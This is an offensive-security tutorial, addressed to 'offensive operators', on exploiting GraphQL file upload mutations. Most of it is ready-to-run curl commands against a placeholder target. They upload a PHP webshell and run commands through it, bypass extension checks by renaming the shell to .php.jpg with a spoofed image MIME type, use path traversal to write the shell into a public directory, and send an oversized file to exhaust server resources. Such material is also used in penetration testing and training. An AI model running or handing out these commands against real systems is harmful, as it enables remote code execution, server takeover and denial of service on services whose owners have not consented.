---
title: Exploiting GraphQL File Upload Vulnerabilities
description: Learn techniques to exploit GraphQL file upload vulnerabilities for code
  execution and data access.
keywords:
- GraphQL file upload
- vulnerabilities
- multipart/form-data
- path traversal
- malicious file upload
- file type validation
- remote code execution
- resource exhaustion
---

# File Upload Exploitation

## Context

This article teaches the exploitation of insecure GraphQL file upload mechanisms, enabling offensive operators to perform actions such as code execution, unauthorized data access, or further system compromise. It assumes that the reader is familiar with the structure of GraphQL schemas, HTTP multipart/form-data requests, general file upload mechanisms within web applications, and basic GraphQL injection techniques.

## Theory

### GraphQL File Upload Mechanisms

In GraphQL, file uploads are typically handled through multipart/form-data requests. These requests are linked to GraphQL mutations that accept file input. The core principle here is that file upload mutations map file variables to server-side storage locations or processing routines. The typical data flow begins with the client sending a multipart request; the GraphQL resolver then processes the file, eventually leading to the file being stored or parsed on the server.

### Vulnerabilities in GraphQL File Uploads

Common vulnerabilities present in GraphQL file uploads include:

- **Insufficient file type validation:** This allows the upload of executable or malicious files.
- **Improper file path handling:** This makes possible directory traversal or file overwrites.
- **Lack of size restrictions:** This opens up avenues for resource exhaustion or bypassing intended limits.
- **Insecure file inclusion:** This vulnerability permits the execution or inclusion of uploaded files by the application.

### Attacker Techniques for Exploiting File Uploads

To exploit these vulnerabilities, attackers might:

1. Identify the file upload mutation and accepted file types through introspection or documentation.
2. Craft multipart/form-data requests with malicious payloads or files with bypassed extensions.
3. Use path traversal in file variables to control the upload destination.
4. Trigger execution or inclusion of the uploaded file through subsequent GraphQL queries or direct access.

## Practice

### Malicious File Upload via GraphQL Mutation

To upload a PHP webshell using a crafted GraphQL file upload mutation, execute the following:

```bash
curl -X POST http://target/graphql \
  -F operations='{"query": "mutation ($file: Upload!) { uploadFile(file: $file) { url } }", "variables": {"file": null}}' \
  -F map='{ "0": ["variables.file"] }' \
  -F 0=@shell.php;type=application/x-php
```

- **Check the response:** Look for the uploaded file URL.

To trigger the uploaded webshell and execute a command:

```bash
curl http://target/uploads/shell.php?cmd=id
```

**Outcome:** This attack leads to remote code execution, granting the attacker the ability to execute arbitrary commands via the uploaded file.

### File Type Validation Bypass

Rename the payload to bypass simple extension checks:

```bash
mv shell.php shell.php.jpg
```

Upload the disguised payload by setting the MIME type as an image:

```bash
curl -X POST http://target/graphql \
  -F operations='{"query": "mutation ($file: Upload!) { uploadFile(file: $file) { url } }", "variables": {"file": null}}' \
  -F map='{ "0": ["variables.file"] }' \
  -F 0=@shell.php.jpg;type=image/jpeg
```

- **Access the uploaded file:** Confirm it allows execution or inclusion.

**Outcome:** This technique bypasses input validation by accepting malicious files despite type restrictions.

### Path Traversal in File Upload

Exploit path traversal by controlling upload destination:

```bash
curl -X POST http://target/graphql \
  -F operations='{"query": "mutation ($file: Upload!, $path: String!) { uploadFile(file: $file, path: $path) { url } }", "variables": {"file": null, "path": "../../public/shell.php"}}' \
  -F map='{ "0": ["variables.file"] }' \
  -F 0=@shell.php;type=application/x-php
```

- **Confirm file placement:** Verify it was written outside the intended directory.

**Outcome:** This enables attackers to write files to any server location, exploiting path traversal vulnerabilities.

### Oversized File Upload for Resource Exhaustion

Generate a large file to challenge upload size restrictions:

```bash
dd if=/dev/zero of=largefile.jpg bs=10M count=20
```

Attempt to upload this oversized file:

```bash
curl -X POST http://target/graphql \
  -F operations='{"query": "mutation ($file: Upload!) { uploadFile(file: $file) { url } }", "variables": {"file": null}}' \
  -F map='{ "0": ["variables.file"] }' \
  -F 0=@largefile.jpg;type=image/jpeg
```

**Outcome:** This might lead to resource exhaustion, potentially causing a denial of service or bypassing upload size restrictions.

## Tools

- **curl**